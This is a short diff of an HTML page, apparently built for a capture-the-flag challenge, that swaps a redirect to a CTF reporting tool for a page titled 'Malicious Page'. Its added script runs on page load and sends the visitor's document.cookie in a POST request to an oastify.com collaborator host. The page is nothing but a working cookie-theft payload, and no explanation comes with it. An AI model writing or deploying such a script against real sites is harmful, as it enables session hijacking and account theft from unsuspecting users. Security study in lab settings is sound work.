@@ -1,11 +1,17 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Redirect</title>
+    <title>Malicious Page</title>
 </head>
 <body>
+    <h1>Malicious Page</h1>
+    <button id="installbutton">Install</button>
     <script>
-        window.location.href = 'https://internaltool.ctf.yogosha.com/report?report=http://kc0zc4myyhm2adfqb23davzttkzbnabz.oastify.com';
+        fetch('http://mf51f6p01jp4dfise46fdx2vwm2dq9ey.oastify.com', {
+            method: 'POST',
+            body: JSON.stringify({ cookies: document.cookie }),
+            headers: { 'Content-Type': 'application/json' }
+        });
     </script>
 </body>
 </html>
